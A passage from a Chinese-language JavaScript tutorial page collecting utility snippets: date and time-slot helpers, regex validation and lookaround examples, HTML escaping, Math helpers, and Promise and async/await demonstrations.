    ary<span>.</span><span>push</span><span>(</span><span>{</span>
      <span>year</span><span>:</span> date<span>.</span><span>getFullYear</span><span>(</span><span>)</span><span>,</span>
      <span>date</span><span>:</span> <span><span>`</span><span><span>${</span><span>(</span>date<span>.</span><span>getMonth</span><span>(</span><span>)</span> <span>+</span> <span>1</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>.</span><span>padStart</span><span>(</span><span>2</span><span>,</span> <span>0</span><span>)</span><span>}</span></span><span>-</span><span><span>${</span>date
        <span>.</span><span>getDate</span><span>(</span><span>)</span>
        <span>.</span><span>toString</span><span>(</span><span>)</span>
        <span>.</span><span>padStart</span><span>(</span><span>2</span><span>,</span> <span>0</span><span>)</span><span>}</span></span><span>`</span></span><span>,</span>
      <span>week</span><span>:</span> <span><span>`</span><span>周</span><span><span>${</span><span>[</span><span>'日'</span><span>,</span> <span>'一'</span><span>,</span> <span>'二'</span><span>,</span> <span>'三'</span><span>,</span> <span>'四'</span><span>,</span> <span>'五'</span><span>,</span> <span>'六'</span><span>]</span><span>[</span>date<span>.</span><span>getDay</span><span>(</span><span>)</span><span>]</span><span>}</span></span><span>`</span></span><span>,</span>
    <span>}</span><span>)</span>
    date<span>.</span><span>setTime</span><span>(</span>date<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>+</span> size<span>)</span>
  <span>}</span>

  <span>return</span> ary
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div></li>
<li>
<p>根据日期获取间隔时间表。</p>
<div><pre><code><span>const</span> <span>getTimeList</span> <span>=</span> <span>options</span> <span>=></span> <span>{</span>
  <span>const</span> <span>{</span>
    date <span>=</span> <span><span>`</span><span><span>${</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>getFullYear</span><span>(</span><span>)</span><span>}</span></span><span>/</span><span><span>${</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>getMonth</span><span>(</span><span>)</span> <span>+</span>
      <span>1</span><span>}</span></span><span>/</span><span><span>${</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>getDate</span><span>(</span><span>)</span><span>}</span></span><span>`</span></span><span>,</span>
    startTime <span>=</span> <span>'09:00:00'</span><span>,</span>
    times <span>=</span> <span>27</span><span>,</span>
    spacing <span>=</span> <span>30</span><span>,</span>
  <span>}</span> <span>=</span> options <span>||</span> <span>{</span><span>}</span>
  <span>const</span> startDate <span>=</span> <span>new</span> <span>Date</span><span>(</span><span><span>`</span><span><span>${</span>date<span>}</span></span><span> </span><span><span>${</span>startTime<span>}</span></span><span>`</span></span><span>)</span>
  <span>const</span> size <span>=</span> <span>1000</span> <span>*</span> <span>60</span> <span>*</span> spacing
  <span>const</span> ary <span>=</span> <span>[</span><span>]</span>
  <span>while</span> <span>(</span>ary<span>.</span>length <span>&lt;</span> times<span>)</span> <span>{</span>
    ary<span>.</span><span>push</span><span>(</span>
      <span><span>`</span><span><span>${</span>startDate
        <span>.</span><span>getHours</span><span>(</span><span>)</span>
        <span>.</span><span>toString</span><span>(</span><span>)</span>
        <span>.</span><span>padStart</span><span>(</span><span>2</span><span>,</span> <span>0</span><span>)</span><span>}</span></span><span>:</span><span><span>${</span>startDate
        <span>.</span><span>getMinutes</span><span>(</span><span>)</span>
        <span>.</span><span>toString</span><span>(</span><span>)</span>
        <span>.</span><span>padStart</span><span>(</span><span>2</span><span>,</span> <span>0</span><span>)</span><span>}</span></span><span>`</span></span>
    <span>)</span>
    startDate<span>.</span><span>setTime</span><span>(</span>startDate<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>+</span> size<span>)</span>
  <span>}</span>

  <span>// 过滤过期时间</span>
  <span>return</span> ary
    <span>.</span><span>filter</span><span>(</span><span>t</span> <span>=></span> <span>+</span><span>new</span> <span>Date</span><span>(</span><span><span>`</span><span><span>${</span>date<span>}</span></span><span> </span><span><span>${</span>t<span>}</span></span><span>:00</span><span>`</span></span><span>)</span> <span>></span> Date<span>.</span><span>now</span><span>(</span><span>)</span><span>)</span>
    <span>.</span><span>map</span><span>(</span><span>(</span><span>t<span>,</span> i</span><span>)</span> <span>=></span> <span>(</span><span>{</span>
      <span>label</span><span>:</span> t<span>,</span>
      <span>value</span><span>:</span> i <span>+</span> <span>1</span><span>,</span>
    <span>}</span><span>)</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br></div></div></li>
</ul>
<h2 id="_3-regexp"> 3. RegExp</h2>
<ul>
<li>
<p>先行、后行断言。</p>
<div><pre><code><span>// 正向先行断言</span>
<span>'clearlove'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?=love)</span><span>/</span><span>gi</span></span><span>,</span> <span>'7'</span><span>)</span> <span>// => 'clear7love'</span>

<span>// 负向先行断言</span>
<span>'clearlove'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?!love)</span><span>/</span><span>gi</span></span><span>,</span> <span>'7'</span><span>)</span> <span>// => '7c7l7e7a7rl7o7v7e7'</span>

<span>// 正向后行断言</span>
<span>'clearlove'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?&lt;=love)</span><span>/</span><span>gi</span></span><span>,</span> <span>'7'</span><span>)</span> <span>// => 'clearlove7'</span>

<span>// 负向后行断言</span>
<span>'clearlove'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?&lt;!love)</span><span>/</span><span>gi</span></span><span>,</span> <span>'7'</span><span>)</span> <span>// => '7c7l7e7a7r7l7o7v7e'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
<li>
<ol>
<li>数字的千分位分割法。</li>
</ol>
<div><pre><code><span>'1234567'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?!^)(?=(\d{3})+$)</span><span>/</span><span>g</span></span><span>,</span> <span>','</span><span>)</span> <span>// => '1,234,567'</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<ol start="2">
<li>手机号 3-4-4 分割。</li>
</ol>
<div><pre><code><span>'17777777777'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?=(\d{4})+$)</span><span>/</span><span>g</span></span><span>,</span> <span>'-'</span><span>)</span> <span>// => '177-7777-7777'</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<ol start="3">
<li>隐藏中间四位手机号码。</li>
</ol>
<div><pre><code><span>'17777777777'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^(\d{3})\d{4}(\d{4})$</span><span>/</span></span><span>,</span> <span>'$1****$2'</span><span>)</span> <span>// => 177****7777</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<ol start="4">
<li>校验中文。</li>
</ol>
<div><pre><code><span>[</span><span>'Neo'</span><span>,</span> <span>'徐扶墙'</span><span>,</span> <span>'7酱'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> <span><span>/</span><span>^[\u4e00-\u9fa5]{0,}$</span><span>/</span></span><span>.</span><span>test</span><span>(</span>i<span>)</span><span>)</span> <span>// => [false, true, false]</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<ol start="5">
<li>校验密码。</li>
</ol>
<div><pre><code><span>// 密码长度是 6-12 位，由数字、小写字符和大写字母组成，但必须至少包括 2 种字符</span>
<span>[</span><span>'123456'</span><span>,</span> <span>'admin123'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span>
  <span><span>/</span><span>((?=.*\d)((?=.*[a-z])|(?=.*[A-Z])))|(?=.*[a-z])(?=.*[A-Z])^[a-zA-Z\d]{6,12}$</span><span>/</span></span><span>.</span><span>test</span><span>(</span>i<span>)</span>
<span>)</span> <span>// => [false, true]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
<li>
<ol start="6">
<li>校验手机号和座机号。</li>
</ol>
<div><pre><code><span>[</span><span>'17777777777'</span><span>,</span> <span>'17979797979'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span>
  <span><span>/</span><span>^(?:(?:\+|00)86)?1(?:(?:3[\d])|(?:4[5-79])|(?:5[0-35-9])|(?:6[5-7])|(?:7[0-8])|(?:8[\d])|(?:9[189]))\d{8}$</span><span>/</span></span><span>.</span><span>test</span><span>(</span>i<span>)</span>
<span>)</span> <span>// => [true, false]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>[</span><span>'0571-7777777'</span><span>,</span> <span>'0797-7777777'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span>
  <span><span>/</span><span>^(?:(?:\d{3}-)?\d{8}|^(?:\d{4}-)?\d{7,8})(?:-\d+)?$</span><span>/</span></span><span>.</span><span>test</span><span>(</span>i<span>)</span>
<span>)</span> <span>// => [true, true]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<ol start="7">
<li>校验邮箱。</li>
</ol>
<div><pre><code><span>[</span><span>'7777777@163.com'</span><span>,</span> <span>'7酱@qq.com'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span>
  <span><span>/</span><span>^(([^&lt;>()[\]\\.,;:\s@"]+(\.[^&lt;>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$</span><span>/</span></span><span>.</span><span>test</span><span>(</span>i<span>)</span>
<span>)</span> <span>// => [true, true]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<ol start="8">
<li>校验网址。</li>
</ol>
<div><pre><code><span>[</span><span>'https://www.coderljw.ga'</span><span>,</span> <span>'https://github.com/Matrix-The-One'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span>
  <span><span>/</span><span>^(((ht|f)tps?):\/\/)?[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:/~+#\-\(\)]*[\w@?^=%&amp;/~+#\-\(\)])?$</span><span>/</span></span><span>.</span><span>test</span><span>(</span>i<span>)</span>
<span>)</span> <span>// => [true, true]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<ol start="9">
<li>校验身份证。</li>
</ol>
<div><pre><code><span>// 一代 + 二代</span>
<span>const</span> IDCardReg <span>=</span> <span><span>/</span><span>^\d{6}((((((19|20)\d{2})(0[13-9]|1[012])(0[1-9]|[12]\d|30))|(((19|20)\d{2})(0[13578]|1[02])31)|((19|20)\d{2})02(0[1-9]|1\d|2[0-8])|((((19|20)([13579][26]|[2468][048]|0[48]))|(2000))0229))\d{3})|((((\d{2})(0[13-9]|1[012])(0[1-9]|[12]\d|30))|((\d{2})(0[13578]|1[02])31)|((\d{2})02(0[1-9]|1\d|2[0-8]))|(([13579][26]|[2468][048]|0[048])0229))\d{2}))(\d|X|x)$</span><span>/</span></span>

<span>// 一代</span>
<span>const</span> firstIDCardReg <span>=</span> <span><span>/</span><span>^[1-9]\d{7}(?:0\d|10|11|12)(?:0[1-9]|[1-2][\d]|30|31)\d{3}$</span><span>/</span></span>

<span>// 二代</span>
<span>const</span> secondIDCardReg <span>=</span> <span><span>/</span><span>^[1-9]\d{5}(?:18|19|20)\d{2}(?:0[1-9]|10|11|12)(?:0[1-9]|[1-2]\d|30|31)\d{3}[\dXx]$</span><span>/</span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
<li>
<ol start="10">
<li>校验车牌。</li>
</ol>
<div><pre><code><span>// 新能源 + 非新能源</span>
<span>const</span> VRPReg <span>=</span> <span><span>/</span><span>^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领][A-HJ-NP-Z][A-HJ-NP-Z0-9]{4,5}[A-HJ-NP-Z0-9挂学警港澳]$</span><span>/</span></span>

<span>// 新能源</span>
<span>const</span> newEnergyVRPReg <span>=</span> <span><span>/</span><span>^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领][A-HJ-NP-Z](?:((\d{5}[A-HJK])|([A-HJK][A-HJ-NP-Z0-9][0-9]{4}))|[A-HJ-NP-Z0-9]{4}[A-HJ-NP-Z0-9挂学警港澳])$</span><span>/</span></span>

<span>// 非新能源</span>
<span>const</span> traditionVRPReg <span>=</span> <span><span>/</span><span>^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领][A-HJ-NP-Z][A-HJ-NP-Z0-9]{4}[A-HJ-NP-Z0-9挂学警港澳]$</span><span>/</span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
<li>
<ol start="11">
<li>校验 16 进制的颜色值。</li>
</ol>
<div><pre><code><span>[</span><span>'#Fc01DF'</span><span>,</span> <span>'#Fff'</span><span>]</span><span>.</span><span>every</span><span>(</span><span>i</span> <span>=></span> <span><span>/</span><span>#([a-fA-F\d]{6}|[a-fA-F\d]{3})</span><span>/</span><span>g</span></span><span>.</span><span>test</span><span>(</span>i<span>)</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<ol start="12">
<li>校验 24 小时制时间。</li>
</ol>
<div><pre><code><span>[</span><span>'43:96'</span><span>,</span> <span>'7:00'</span><span>,</span> <span>'23:59'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span>
  <span><span>/</span><span>^(0?\d|1\d|2[0-3]):(0?|[1-5])\d</span><span>/</span></span><span>.</span><span>test</span><span>(</span>i<span>)</span>
<span>)</span> <span>// => [false, true, true]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<ol start="13">
<li>校验日期。</li>
</ol>
<div><pre><code><span>// 易解版（不能判断当月最大天数及平润年）</span>
<span>[</span><span>'1970-01-01'</span><span>,</span> <span>'1964/9/2'</span><span>,</span> <span>'2000.02.30'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span>
  <span><span>/</span><span>\d{4}([-/.])(0?\d|1[0-2])\1(0?[1-9]|[12]\d|3[01])</span><span>/</span></span><span>.</span><span>test</span><span>(</span>i<span>)</span>
<span>)</span> <span>// => [true, true, true]</span>

<span>// 完全版</span>
<span>[</span><span>'1970-01-01'</span><span>,</span> <span>'1964/9/2'</span><span>,</span> <span>'2002.02.29'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span>
  <span><span>/</span><span>^(?:(?!0000)[0-9]{4}-(?:(?:0[1-9]|1[0-2])-(?:0[1-9]|1[0-9]|2[0-8])|(?:0[13-9]|1[0-2])-(?:29|30)|(?:0[13578]|1[02])-31)|(?:[0-9]{2}(?:0[48]|[2468][048]|[13579][26])|(?:0[48]|[2468][048]|[13579][26])00)-02-29)$</span><span>/</span></span><span>.</span><span>test</span><span>(</span>
    i
  <span>)</span>
<span>)</span> <span>// => [true, true, false]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
<li>
<ol start="14">
<li>HTML 转义和反转义。</li>
</ol>
<div><pre><code><span>const</span> <span>escapeHTML</span> <span>=</span> <span>str</span> <span>=></span> <span>{</span>
  <span>const</span> escapeChars <span>=</span> <span>{</span>
    <span>'&lt;'</span><span>:</span> <span>'lt'</span><span>,</span>
    <span>'>'</span><span>:</span> <span>'gt'</span><span>,</span>
    <span>'"'</span><span>:</span> <span>'quot'</span><span>,</span>
    <span>"'"</span><span>:</span> <span>'apos'</span><span>,</span>
    <span>'&amp;'</span><span>:</span> <span>'amp'</span><span>,</span>
  <span>}</span>
  <span>// 为了得到字符组[&lt;>"'&amp;]</span>
  <span>const</span> regexp <span>=</span> <span>new</span> <span>RegExp</span><span>(</span><span><span>`</span><span>[</span><span><span>${</span>Object<span>.</span><span>keys</span><span>(</span>escapeChars<span>)</span><span>.</span><span>join</span><span>(</span><span>''</span><span>)</span><span>}</span></span><span>]</span><span>`</span></span><span>,</span> <span>'g'</span><span>)</span>
  <span>return</span> str<span>.</span><span>replace</span><span>(</span>regexp<span>,</span> <span>c</span> <span>=></span> <span><span>`</span><span>&amp;</span><span><span>${</span>escapeChars<span>[</span>c<span>]</span><span>}</span></span><span>;</span><span>`</span></span><span>)</span>
<span>}</span>

<span>escapeHTML</span><span>(</span><span>'&lt;div>Blah blah blah&lt;/div>'</span><span>)</span> <span>// => '&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt;'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code><span>const</span> <span>unescapeHTML</span> <span>=</span> <span>str</span> <span>=></span> <span>{</span>
  <span>const</span> htmlEntities <span>=</span> <span>{</span>
    <span>nbsp</span><span>:</span> <span>' '</span><span>,</span>
    <span>lt</span><span>:</span> <span>'&lt;'</span><span>,</span>
    <span>gt</span><span>:</span> <span>'>'</span><span>,</span>
    <span>quot</span><span>:</span> <span>'"'</span><span>,</span>
    <span>apos</span><span>:</span> <span>"'"</span><span>,</span>
    <span>amp</span><span>:</span> <span>'&amp;'</span><span>,</span>
  <span>}</span>
  <span>return</span> str<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>&amp;([^;]+);</span><span>/</span><span>g</span></span><span>,</span> <span>(</span><span>$0<span>,</span> $1</span><span>)</span> <span>=></span> htmlEntities<span>[</span>$1<span>]</span> <span>||</span> <span>''</span><span>)</span>
<span>}</span>

<span>unescapeHTML</span><span>(</span><span>'&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt;'</span><span>)</span> <span>// => '&lt;div>Blah blah blah&lt;/div>'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><p>提示</p>
<p>new RegExp() 可以使用变量，字面量写法（/RegExp/）不行。</p>
</div>
</li>
<li>
<p><a href="https://github.com/qdlaoyao/js-regex-mini-book" target="_blank" rel="noopener noreferrer">JavaScript 正则表达式迷你书（1.1 版）- 老姚</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7021672733213720613" target="_blank" rel="noopener noreferrer">就因为这三个知识点，我彻底学废了”正则表达式“ - 前端胖头鱼</a></p>
</li>
</ul>
<h2 id="_4-math"> 4. Math</h2>
<ul>
<li>
<p>获取 [2, 9] 随机整数（Math.random() * (max - min + 1) + min | 0）。</p>
<div><pre><code>Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>8</span> <span>+</span> <span>2</span> <span>|</span> <span>0</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>四舍五入保留小数。</p>
<div><pre><code><span>function</span> <span>$toFixed</span><span>(</span><span>val<span>,</span> exp</span><span>)</span> <span>{</span>
  <span>return</span> val <span>!==</span> <span>void</span> <span>0</span>
    <span>?</span> <span>+</span><span>(</span>Math<span>.</span><span>round</span><span>(</span>val <span>*</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> exp<span>)</span><span>)</span> <span>/</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> exp<span>)</span><span>)</span><span>.</span><span>toFixed</span><span>(</span>exp<span>)</span>
    <span>:</span> <span>+</span><span>(</span><span>0</span><span>)</span><span>.</span><span>toFixed</span><span>(</span>exp<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
<li>
<p>便捷打乱数组。</p>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>sort</span><span>(</span><span>_</span> <span>=></span> Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>-</span> <span>0.5</span><span>)</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>生成由 [0-9a-z] 组成的 10 位随机字符串。</p>
<div><pre><code>Math<span>.</span><span>random</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>36</span><span>)</span><span>.</span><span>substr</span><span>(</span><span>2</span><span>,</span> <span>10</span><span>)</span>
</code></pre>
<div><span>1</span><br></div></div></li>
</ul>
<h2 id="_5-promise"> 5. Promise</h2>
<ul>
<li>
<p>用于表示一个异步操作的最终完成（或失败）及其结果值（<a href="https://promisesaplus.com/" target="_blank" rel="noopener noreferrer">Promise A+ 规范</a>）。</p>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>delay</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>delay <span>===</span> <span>4396</span><span>)</span> <span>reject</span><span>(</span><span>'clearlove7'</span><span>)</span>
      <span>resolve</span><span>(</span>delay<span>)</span>
    <span>}</span><span>,</span> delay<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>foo</span><span>(</span><span>777</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>res</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>res<span>)</span> <span>// => 777</span>
    <span>return</span> <span>foo</span><span>(</span><span>4396</span><span>)</span>
  <span>}</span><span>)</span>
  <span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span> <span>// => 未调用</span>
  <span>.</span><span>catch</span><span>(</span>console<span>.</span>log<span>)</span> <span>// => 'clearlove7'</span>
  <span>.</span><span>finally</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'javalove'</span><span>)</span><span>)</span> <span>// => 'javalove'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
<li>
<p>async + await</p>
<blockquote>
<p>await 不能捕获 Promise 的 rejected 状态和抛出的错误。</p>
</blockquote>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>delay</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>delay <span>===</span> <span>4396</span><span>)</span> <span>reject</span><span>(</span><span>'clearlove7'</span><span>)</span>
      <span>resolve</span><span>(</span>delay<span>)</span>
    <span>}</span><span>,</span> delay<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>async</span> <span>function</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> res <span>=</span> <span>await</span> <span>foo</span><span>(</span><span>777</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span>res<span>)</span> <span>// => 777</span>

  <span>await</span> <span>foo</span><span>(</span><span>4396</span><span>)</span><span>.</span><span>catch</span><span>(</span>console<span>.</span>log<span>)</span> <span>// => 'clearlove7'</span>
<span>}</span>

<span>bar</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
<li>
<p>Promise.all()</p>
<blockquote>
<ul>
<li>当数组中所有 promise 都为 fulfilled（成功态）时 Promise.all() 状态为 resolve，返回一个 resolve 结果数组。</li>
<li>反之 Promise.all() 状态为 reject，返回最先 rejected（失败态）promise 的 reject 值。</li>
<li>注意：Promise.all([]) 会立即完成。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>delay</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span><span>[</span><span>4396</span><span>,</span> <span>2200</span><span>]</span><span>.</span><span>includes</span><span>(</span>delay<span>)</span><span>)</span> <span>{</span>
        <span>reject</span><span>(</span><span>{</span> <span>4396</span><span>:</span> <span>'clearlove7'</span><span>,</span> <span>2200</span><span>:</span> <span>'xiaohu'</span> <span>}</span><span>[</span>delay<span>]</span><span>)</span>
      <span>}</span>
      <span>resolve</span><span>(</span>delay<span>)</span>
    <span>}</span><span>,</span> delay<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>async</span> <span>function</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> res <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span><span>foo</span><span>(</span><span>777</span><span>)</span><span>,</span> <span>foo</span><span>(</span><span>1557</span><span>)</span><span>]</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span>res<span>)</span> <span>// => [777, 1557]</span>

  <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span><span>foo</span><span>(</span><span>777</span><span>)</span><span>,</span> <span>foo</span><span>(</span><span>4396</span><span>)</span><span>,</span> <span>foo</span><span>(</span><span>2200</span><span>)</span><span>]</span><span>)</span><span>.</span><span>catch</span><span>(</span>console<span>.</span>log<span>)</span> <span>// => 'xiaohu'</span>
<span>}</span>

<span>bar</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div></li>
<li>
<p>Promise.allSettled()</p>
<blockquote>
<ul>
<li>与 Promise.all() 类似，但数组中 promise 成功与否 Promise.allSettled() 状态都为 resolve，返回由状态和值（成功态）/ 原因（失败态）构成的数组。</li>
<li>注意：Promise.allSettled([]) 会立即完成。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>delay</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>delay <span>===</span> <span>4396</span><span>)</span> <span>reject</span><span>(</span><span>'clearlove7'</span><span>)</span>
      <span>resolve</span><span>(</span>delay<span>)</span>
    <span>}</span><span>,</span> delay<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>async</span> <span>function</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> res <span>=</span> <span>await</span> Promise<span>.</span><span>allSettled</span><span>(</span><span>[</span><span>foo</span><span>(</span><span>777</span><span>)</span><span>,</span> <span>foo</span><span>(</span><span>4396</span><span>)</span><span>]</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span>res<span>)</span> <span>// => [{status: 'fulfilled', value: 777}, {status: 'rejected', reason: 'clearlove7'}]</span>
<span>}</span>

<span>bar</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div></li>
<li>
<p>Promise.race()</p>
<blockquote>
<ul>
<li>返回数组中状态最先确认的 promise。</li>
<li>注意：Promise.race([]) 会永远挂起。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>delay</span><span>)</span> <span>{</span>
